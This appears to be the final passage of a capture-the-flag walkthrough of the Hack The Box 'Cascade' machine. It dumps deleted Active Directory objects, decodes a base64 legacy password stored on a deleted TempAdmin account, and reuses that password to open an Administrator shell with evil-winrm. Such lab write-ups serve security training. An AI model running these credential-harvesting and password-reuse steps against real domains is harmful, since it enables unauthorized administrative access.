+objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1131
+ProtectedFromAccidentalDeletion : False
+sAMAccountName                  : Scheduled Tasks
+sDRightsEffective               : 0
+uSNChanged                      : 245848
+uSNCreated                      : 114790
+whenChanged                     : 1/28/2020 6:07:55 PM
+whenCreated                     : 1/13/2020 5:21:53 PM
+
+CanonicalName                   : cascade.local/Deleted Objects/{A403B701-A528-4685-A816-FDEE32BDDCBA}
+                                  DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
+CN                              : {A403B701-A528-4685-A816-FDEE32BDDCBA}
+                                  DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
+Created                         : 1/26/2020 2:34:30 AM
+createTimeStamp                 : 1/26/2020 2:34:30 AM
+Deleted                         : True
+Description                     :
+DisplayName                     : Block Potato
+DistinguishedName               : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
+dSCorePropagationData           : {1/1/1601 12:00:00 AM}
+flags                           : 0
+gPCFileSysPath                  : \\cascade.local\SysVol\cascade.local\Policies\{A403B701-A528-4685-A816-FDEE32BDDCBA}
+gPCFunctionalityVersion         : 2
+gPCMachineExtensionNames        : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1D-2488-11D1-A28C-00C04FB94F17}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1D-2488-11D1-A28C-00C04FB94F17}]
+instanceType                    : 4
+isDeleted                       : True
+LastKnownParent                 : CN=Policies,CN=System,DC=cascade,DC=local
+Modified                        : 1/26/2020 2:40:52 AM
+modifyTimeStamp                 : 1/26/2020 2:40:52 AM
+msDS-LastKnownRDN               : {A403B701-A528-4685-A816-FDEE32BDDCBA}
+Name                            : {A403B701-A528-4685-A816-FDEE32BDDCBA}
+                                  DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  :
+ObjectClass                     : groupPolicyContainer
+ObjectGUID                      : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
+ProtectedFromAccidentalDeletion : False
+sDRightsEffective               : 0
+showInAdvancedViewOnly          : True
+uSNChanged                      : 196701
+uSNCreated                      : 196688
+versionNumber                   : 2
+whenChanged                     : 1/26/2020 2:40:52 AM
+whenCreated                     : 1/26/2020 2:34:30 AM
+
+CanonicalName                   : cascade.local/Deleted Objects/Machine
+                                  DEL:93c23674-e411-400b-bb9f-c0340bda5a34
+CN                              : Machine
+                                  DEL:93c23674-e411-400b-bb9f-c0340bda5a34
+Created                         : 1/26/2020 2:34:31 AM
+createTimeStamp                 : 1/26/2020 2:34:31 AM
+Deleted                         : True
+Description                     :
+DisplayName                     :
+DistinguishedName               : CN=Machine\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local
+dSCorePropagationData           : {1/1/1601 12:00:00 AM}
+instanceType                    : 4
+isDeleted                       : True
+LastKnownParent                 : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
+Modified                        : 1/26/2020 2:40:52 AM
+modifyTimeStamp                 : 1/26/2020 2:40:52 AM
+msDS-LastKnownRDN               : Machine
+Name                            : Machine
+                                  DEL:93c23674-e411-400b-bb9f-c0340bda5a34
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  :
+ObjectClass                     : container
+ObjectGUID                      : 93c23674-e411-400b-bb9f-c0340bda5a34
+ProtectedFromAccidentalDeletion : False
+sDRightsEffective               : 0
+showInAdvancedViewOnly          : True
+uSNChanged                      : 196699
+uSNCreated                      : 196689
+whenChanged                     : 1/26/2020 2:40:52 AM
+whenCreated                     : 1/26/2020 2:34:31 AM
+
+CanonicalName                   : cascade.local/Deleted Objects/User
+                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
+CN                              : User
+                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
+Created                         : 1/26/2020 2:34:31 AM
+createTimeStamp                 : 1/26/2020 2:34:31 AM
+Deleted                         : True
+Description                     :
+DisplayName                     :
+DistinguishedName               : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local
+dSCorePropagationData           : {1/1/1601 12:00:00 AM}
+instanceType                    : 4
+isDeleted                       : True
+LastKnownParent                 : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
+Modified                        : 1/26/2020 2:40:52 AM
+modifyTimeStamp                 : 1/26/2020 2:40:52 AM
+msDS-LastKnownRDN               : User
+Name                            : User
+                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  :
+ObjectClass                     : container
+ObjectGUID                      : 746385f2-e3a0-4252-b83a-5a206da0ed88
+ProtectedFromAccidentalDeletion : False
+sDRightsEffective               : 0
+showInAdvancedViewOnly          : True
+uSNChanged                      : 196700
+uSNCreated                      : 196690
+whenChanged                     : 1/26/2020 2:40:52 AM
+whenCreated                     : 1/26/2020 2:34:31 AM
+
+accountExpires                  : 9223372036854775807
+badPasswordTime                 : 0
+badPwdCount                     : 0
+CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
+CN                              : TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+codePage                        : 0
+countryCode                     : 0
+Created                         : 1/27/2020 3:23:08 AM
+createTimeStamp                 : 1/27/2020 3:23:08 AM
+Deleted                         : True
+Description                     :
+DisplayName                     : TempAdmin
+DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
+dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
+givenName                       : TempAdmin
+instanceType                    : 4
+isDeleted                       : True
+LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
+lastLogoff                      : 0
+lastLogon                       : 0
+logonCount                      : 0
+Modified                        : 1/27/2020 3:24:34 AM
+modifyTimeStamp                 : 1/27/2020 3:24:34 AM
+msDS-LastKnownRDN               : TempAdmin
+Name                            : TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  :
+ObjectClass                     : user
+ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
+objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
+primaryGroupID                  : 513
+ProtectedFromAccidentalDeletion : False
+pwdLastSet                      : 132245689883479503
+sAMAccountName                  : TempAdmin
+sDRightsEffective               : 0
+userAccountControl              : 66048
+userPrincipalName               : TempAdmin@cascade.local
+uSNChanged                      : 237705
+uSNCreated                      : 237695
+whenChanged                     : 1/27/2020 3:24:34 AM
+whenCreated                     : 1/27/2020 3:23:08 AM
+
+
+
+*Evil-WinRM* PS C:\Users\arksvc\Documents> 
+
+┌──(kali㉿kali)-[~]
+└─$ echo YmFDVDNyMWFOMDBkbGVz | base64 -d    
+baCT3r1aN00dles     
+
+"The returned string looks like a password but the user is deleted, so we cannot use it to log in as
+TempAdmin . However, we recall the email correspondence mentioned that the Administrator
+account has the same password as the TempAdmin account. Let's login as the Administrator
+instead"
+
+┌──(kali㉿kali)-[~]
+└─$ evil-winrm -i 10.10.10.182 -u Administrator -p baCT3r1aN00dles
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                      
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                 
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> 
